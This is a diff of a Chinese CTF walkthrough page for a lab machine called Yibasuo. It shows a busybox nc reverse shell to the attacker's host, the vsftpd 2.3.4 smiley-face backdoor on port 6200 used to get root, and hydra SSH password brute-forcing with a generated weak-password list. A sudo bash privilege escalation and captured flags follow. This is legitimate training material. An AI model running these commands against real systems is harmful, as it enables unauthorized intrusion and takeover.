-        <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-cce">\n</span><span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s">'='</span> <span class="pl-c1">*</span> <span class="pl-c1">50</span><span class="pl-kos">}</span></span><span class="pl-cce">\n</span>成功命令: "</span>)
-        <span class="pl-k">for</span> <span class="pl-s1">cmd</span>, <span class="pl-s1">response</span> <span class="pl-c1">in</span> <span class="pl-s1">success_results</span>:
-            <span class="pl-c">#print(f"\n{'=' * 50}\n成功命令: {cmd}\n响应内容:\n{response[:1000]}{'...' if len(response) &gt; 1000 else ''}")</span>
-            <span class="pl-en">print</span>(<span class="pl-s">f"<span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">cmd</span><span class="pl-kos">}</span></span>"</span>)
-    <span class="pl-k">else</span>:
-        <span class="pl-en">print</span>(<span class="pl-s">"[-] 未发现有效命令"</span>)
+    # 输出最终结果
+    print("\n\n爆破完成！结果汇总：")
+    if success_results:
+        print(f"\n{'=' * 50}\n成功命令: ")
+        for cmd, response in success_results:
+            #print(f"\n{'=' * 50}\n成功命令: {cmd}\n响应内容:\n{response[:1000]}{'...' if len(response) &gt; 1000 else ''}")
+            print(f"{cmd}")
+    else:
+        print("[-] 未发现有效命令")
 
-<span class="pl-k">except</span> <span class="pl-v">FileNotFoundError</span>:
-    <span class="pl-en">print</span>(<span class="pl-s">f"[!] 字典文件不存在: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-s1">dict_path</span><span class="pl-kos">}</span></span>"</span>)
-<span class="pl-k">except</span> <span class="pl-v">KeyboardInterrupt</span>:
-    <span class="pl-en">print</span>(<span class="pl-s">"<span class="pl-cce">\n</span>[!] 用户中断操作"</span>)</pre></div>
+except FileNotFoundError:
+    print(f"[!] 字典文件不存在: {dict_path}")
+except KeyboardInterrupt:
+    print("\n[!] 用户中断操作")
+</code></pre>
 <p>运行结果</p>
 <pre class="notranslate"><code class="notranslate">爆破完成！结果汇总：
 busybox
@@ -636,54 +646,57 @@ uptime
 whoami
 </code></pre>
 <p>测试有<code class="notranslate">busybox</code>，直接去反弹个<code class="notranslate">shell</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>busybox nc 192.168.31.126 1234 -e /bin/bash</span>
-└─<span class="pl-c"><span class="pl-c">#</span> nc -lvp 1234</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">#busybox nc 192.168.31.126 1234 -e /bin/bash
+└─# nc -lvp 1234
 listening on [any] 1234 ...
 id
 192.168.31.10: inverse host lookup failed: Host name lookup failure
 connect to [192.168.31.126] from (UNKNOWN) [192.168.31.10] 41088
-uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
-<h5>拿到<code class="notranslate">user.txt</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Yibasuo:/var/www/html/secure$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
-www-data@Yibasuo:/var/www/html/secure$ <span class="pl-c1">cd</span> /home/
+</code></pre>
+<h5>拿到<code class="notranslate">user.txt</code></h5>
+<pre lang="shell" class="notranslate"><code class="notranslate">www-data@Yibasuo:/var/www/html/secure$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@Yibasuo:/var/www/html/secure$ cd /home/
 www-data@Yibasuo:/home$ ls
 ftp  todd
-www-data@Yibasuo:/home$ <span class="pl-c1">cd</span> todd/
+www-data@Yibasuo:/home$ cd todd/
 www-data@Yibasuo:/home/todd$ ls
 user.txt
 www-data@Yibasuo:/home/todd$ cat user.txt
 flag{user-43109792-4b81-11f0-a435-9731ae49dbea}
-</pre></div>
+
+</code></pre>
 <p>果然做了限制<code class="notranslate">6200</code>端口访问防火墙</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Yibasuo:/tmp$ ss -tnlup
+<pre lang="shell" class="notranslate"><code class="notranslate">www-data@Yibasuo:/tmp$ ss -tnlup
 Netid        State         Recv-Q        Send-Q               Local Address:Port
                Peer Address:Port
 udp          UNCONN        0             0                          0.0.0.0:68
-                    0.0.0.0:<span class="pl-k">*</span>
+                    0.0.0.0:*
 tcp          LISTEN        0             32                         0.0.0.0:21
-                    0.0.0.0:<span class="pl-k">*</span>
+                    0.0.0.0:*
 tcp          LISTEN        0             128                        0.0.0.0:22
-                    0.0.0.0:<span class="pl-k">*</span>
+                    0.0.0.0:*
 tcp          LISTEN        0             128                           [::]:22
-                       [::]:<span class="pl-k">*</span>
-tcp          LISTEN        0             128                              <span class="pl-k">*</span>:80
-                          <span class="pl-k">*</span>:<span class="pl-k">*</span>
+                       [::]:*
+tcp          LISTEN        0             128                              *:80
+                          *:*
 www-data@Yibasuo:/tmp$
 www-data@Yibasuo:/tmp$  cat /etc/iptables/rules.v4
-<span class="pl-c"><span class="pl-c">#</span> Generated by xtables-save v1.8.2 on Tue Jun 17 10:21:28 2025</span>
-<span class="pl-k">*</span>filter
+# Generated by xtables-save v1.8.2 on Tue Jun 17 10:21:28 2025
+*filter
 :INPUT ACCEPT [85:8767]
 :FORWARD ACCEPT [0:0]
 :OUTPUT ACCEPT [74:9890]
 -A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 6200 -j ACCEPT
 -A INPUT -p tcp -m tcp --dport 6200 -j DROP
 COMMIT
-<span class="pl-c"><span class="pl-c">#</span> Completed on Tue Jun 17 10:21:28 2025</span>
-www-data@Yibasuo:/tmp$</pre></div>
+# Completed on Tue Jun 17 10:21:28 2025
+www-data@Yibasuo:/tmp$
+</code></pre>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
 <h5><code class="notranslate">Ftp笑脸漏洞（VSFTPD 2.3.4）</code>利用</h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">kali└─<span class="pl-c"><span class="pl-c">#</span> ftp $IP</span>
+<pre lang="shell" class="notranslate"><code class="notranslate">kali└─# ftp $IP
 Connected to 192.168.31.10.
 220 (vsFTPd 2.3.4)
 Name (192.168.31.10:root): a:)
@@ -691,107 +704,114 @@ Name (192.168.31.10:root): a:)
 Password:
 
 421 Service not available, remote server timed out. Connection closed.
-ftp: Login failed</pre></div>
+ftp: Login failed
+</code></pre>
 <p>靶机上直接访问本机<code class="notranslate">127.0.0.1 </code>的 <code class="notranslate">6200 </code>端口，就可以触发<code class="notranslate">Ftp笑脸漏洞（VSFTPD 2.3.4）</code>获取<code class="notranslate">root</code>权限了，｛<code class="notranslate">Ftp </code>笑脸漏洞， 用户名后门加<code class="notranslate"> :)</code> 然后随便输入密码 即可 开启 <code class="notranslate">6200 </code>后门｝</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Yibasuo:/tmp$ busybox nc 127.0.0.1 6200
-nc: can<span class="pl-s"><span class="pl-pds">'</span>t connect to remote host (127.0.0.1): Connection refused</span>
-<span class="pl-s">www-data@Yibasuo:/tmp$</span>
-<span class="pl-s">www-data@Yibasuo:/tmp$</span>
-<span class="pl-s">www-data@Yibasuo:/tmp$ ss -tnlup</span>
-<span class="pl-s">Netid        State         Recv-Q        Send-Q               Local Address:Port</span>
-<span class="pl-s">               Peer Address:Port</span>
-<span class="pl-s">udp          UNCONN        0             0                          0.0.0.0:68</span>
-<span class="pl-s">                    0.0.0.0:*</span>
-<span class="pl-s">tcp          LISTEN        0             32                         0.0.0.0:21</span>
-<span class="pl-s">                    0.0.0.0:*</span>
-<span class="pl-s">tcp          LISTEN        0             128                        0.0.0.0:22</span>
-<span class="pl-s">                    0.0.0.0:*</span>
-<span class="pl-s">tcp          LISTEN        0             100                        0.0.0.0:6200</span>
-<span class="pl-s">                    0.0.0.0:*</span>
-<span class="pl-s">tcp          LISTEN        0             128                           [::]:22</span>
-<span class="pl-s">                       [::]:*</span>
-<span class="pl-s">tcp          LISTEN        0             128                              *:80</span>
-<span class="pl-s">                          *:*</span>
-<span class="pl-s">www-data@Yibasuo:/tmp$ busybox nc 127.0.0.1 6200</span>
-<span class="pl-s">id</span>
-<span class="pl-s">uid=0(root) gid=0(root) groups=0(root)</span>
-<span class="pl-s">cd /root</span>
-<span class="pl-s">ls</span>
-<span class="pl-s">root.txt</span>
-<span class="pl-s">cat root.txt</span>
-<span class="pl-s">flag{root-15d4d3ec-4b81-11f0-9da9-b378f7bb3e40}</span></pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">www-data@Yibasuo:/tmp$ busybox nc 127.0.0.1 6200
+nc: can't connect to remote host (127.0.0.1): Connection refused
+www-data@Yibasuo:/tmp$
+www-data@Yibasuo:/tmp$
+www-data@Yibasuo:/tmp$ ss -tnlup
+Netid        State         Recv-Q        Send-Q               Local Address:Port
+               Peer Address:Port
+udp          UNCONN        0             0                          0.0.0.0:68
+                    0.0.0.0:*
+tcp          LISTEN        0             32                         0.0.0.0:21
+                    0.0.0.0:*
+tcp          LISTEN        0             128                        0.0.0.0:22
+                    0.0.0.0:*
+tcp          LISTEN        0             100                        0.0.0.0:6200
+                    0.0.0.0:*
+tcp          LISTEN        0             128                           [::]:22
+                       [::]:*
+tcp          LISTEN        0             128                              *:80
+                          *:*
+www-data@Yibasuo:/tmp$ busybox nc 127.0.0.1 6200
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+root.txt
+cat root.txt
+flag{root-15d4d3ec-4b81-11f0-9da9-b378f7bb3e40}
+</code></pre>
 <p><strong>注意</strong>：必须在<code class="notranslate">kali</code>上<code class="notranslate">ftp</code>登陆靶机期间，才能触发<code class="notranslate">Ftp笑脸漏洞</code>（输入密码等待期间靶机上<code class="notranslate">6200</code>端口才是开启状态），此时靶机访问6200端口即可获取<code class="notranslate">root</code>权限</p>
 <h3>6.解法2：获得<code class="notranslate">todd</code>权限</h3>
 <p>获取<code class="notranslate">www-data</code>权限后发现<code class="notranslate">home</code>目录下有账户<code class="notranslate">todd</code>，爆破密码，群主分享了针对特定账户的弱密码字典生成脚本<code class="notranslate">generate_by_username.sh</code></p>
 <h5>弱密码字典</h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> cat generate_by_username.sh</span>
-<span class="pl-c"><span class="pl-c">#!</span>/bin/bash</span>
+<pre lang="shell" class="notranslate"><code class="notranslate"># cat generate_by_username.sh
+#!/bin/bash
 
-<span class="pl-en">usage</span>(){
-    <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>bash <span class="pl-s"><span class="pl-pds">$(</span>basename <span class="pl-smi">$0</span><span class="pl-pds">)</span></span> &lt;username&gt;<span class="pl-pds">"</span></span>
+usage(){
+    echo "bash $(basename $0) &lt;username&gt;"
 }
 
-[ <span class="pl-k">-z</span> <span class="pl-smi">$1</span> ] <span class="pl-k">&amp;&amp;</span> usage <span class="pl-k">&amp;&amp;</span> <span class="pl-c1">exit</span> 1
+[ -z $1 ] &amp;&amp; usage &amp;&amp; exit 1
 
-username=<span class="pl-smi">$1</span>
-muban=<span class="pl-s"><span class="pl-pds">"</span>muban.key<span class="pl-pds">"</span></span>
+username=$1
+muban="muban.key"
 
-cat <span class="pl-smi">$muban</span><span class="pl-k">|</span>sed <span class="pl-s"><span class="pl-pds">'</span>s/%user%/<span class="pl-pds">'</span></span><span class="pl-smi">$username</span><span class="pl-s"><span class="pl-pds">'</span>/g<span class="pl-pds">'</span></span>
+cat $muban|sed 's/%user%/'$username'/g'
 
-└─<span class="pl-c"><span class="pl-c">#</span> bash /CTF/generate_by_username.sh todd &gt; todd.txt</span>
-└─<span class="pl-c"><span class="pl-c">#</span> cat todd.txt</span>
+└─# bash /CTF/generate_by_username.sh todd &gt; todd.txt
+└─# cat todd.txt
 todd
 todd123
 todd1234
 todd123456
 todd12345
 todd@123
-......</pre></div>
-<h5><code class="notranslate">hydra</code>爆破弱密码</h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> hydra -l todd  -P todd.txt ssh://$IP  -V -I -u -f -e nsr</span>
-Hydra v9.5 (c) 2023 by van Hauser/THC <span class="pl-k">&amp;</span> David Maciejak - Please <span class="pl-k">do</span> not use <span class="pl-k">in</span> military or secret service organizations, or <span class="pl-k">for</span> illegal purposes (this is non-binding, these <span class="pl-k">***</span> ignore laws and ethics anyway).
 ......
-[22][ssh] host: 192.168.31.10   login: todd   password: todd123<span class="pl-k">!</span>@<span class="pl-c"><span class="pl-c">#</span></span>
-[STATUS] attack finished <span class="pl-k">for</span> 192.168.31.10 (valid pair found)
+</code></pre>
+<h5><code class="notranslate">hydra</code>爆破弱密码</h5>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# hydra -l todd  -P todd.txt ssh://$IP  -V -I -u -f -e nsr
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+......
+[22][ssh] host: 192.168.31.10   login: todd   password: todd123!@#
+[STATUS] attack finished for 192.168.31.10 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-22 12:38:52</pre></div>
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-22 12:38:52
+</code></pre>
 <p>拿到<code class="notranslate">ssh</code>的密码<code class="notranslate">todd/todd123!@#</code></p>
 <h5>拿到<code class="notranslate">user.txt</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> ssh todd@$IP</span>
-todd@192.168.31.10<span class="pl-s"><span class="pl-pds">'</span>s password:</span>
-<span class="pl-s">Linux Yibasuo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span>
-<span class="pl-s"></span>
-<span class="pl-s">The programs included with the Debian GNU/Linux system are free software;</span>
-<span class="pl-s">the exact distribution terms for each program are described in the</span>
-<span class="pl-s">individual files in /usr/share/doc/*/copyright.</span>
-<span class="pl-s"></span>
-<span class="pl-s">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
-<span class="pl-s">permitted by applicable law.</span>
-<span class="pl-s">todd@Yibasuo:~$ id</span>
-<span class="pl-s">uid=1001(todd) gid=1001(todd) groups=1001(todd)</span>
-<span class="pl-s">todd@Yibasuo:~$ cat /home/todd/user.txt</span>
-<span class="pl-s">flag{user-43109792-4b81-11f0-a435-9731ae49dbea}</span></pre></div>
+<pre lang="shell" class="notranslate"><code class="notranslate">└─# ssh todd@$IP
+todd@192.168.31.10's password:
+Linux Yibasuo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+todd@Yibasuo:~$ id
+uid=1001(todd) gid=1001(todd) groups=1001(todd)
+todd@Yibasuo:~$ cat /home/todd/user.txt
+flag{user-43109792-4b81-11f0-a435-9731ae49dbea}
+</code></pre>
 <h3>7.获得<code class="notranslate">root</code>权限</h3>
 <p><code class="notranslate">sudo</code>发现所有用户能够以 <code class="notranslate">root </code>身份运行 <code class="notranslate">/usr/bin/bash</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">todd@Yibasuo:<span class="pl-k">~</span>$ sudo -l
-Matching Defaults entries <span class="pl-k">for</span> todd on Yibasuo:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+<pre lang="shell" class="notranslate"><code class="notranslate">todd@Yibasuo:~$ sudo -l
+Matching Defaults entries for todd on Yibasuo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
 User todd may run the following commands on Yibasuo:
     (ALL) NOPASSWD: /usr/bin/bash
     
-todd@Yibasuo:<span class="pl-k">~</span>$ sudo bash -p
+todd@Yibasuo:~$ sudo bash -p
 root@Yibasuo:/home/todd# id
-uid=0(root) gid=0(root) groups=0(root)    </pre></div>
+uid=0(root) gid=0(root) groups=0(root)    
+</code></pre>
 <p>直接<code class="notranslate">bash -p</code>提权</p>
 <h5>拿到<code class="notranslate">root.txt</code></h5>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@Yibasuo:/home/todd# id
+<pre lang="shell" class="notranslate"><code class="notranslate">root@Yibasuo:/home/todd# id
 uid=0(root) gid=0(root) groups=0(root)
-root@Yibasuo:/home/todd# <span class="pl-c1">cd</span>
-root@Yibasuo:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls</span>
+root@Yibasuo:/home/todd# cd
+root@Yibasuo:~# ls
 root.txt
-root@Yibasuo:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> cat root.txt</span>
-flag{root-15d4d3ec-4b81-11f0-9da9-b378f7bb3e40}</pre></div></div>
+root@Yibasuo:~# cat root.txt
+flag{root-15d4d3ec-4b81-11f0-9da9-b378f7bb3e40}
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
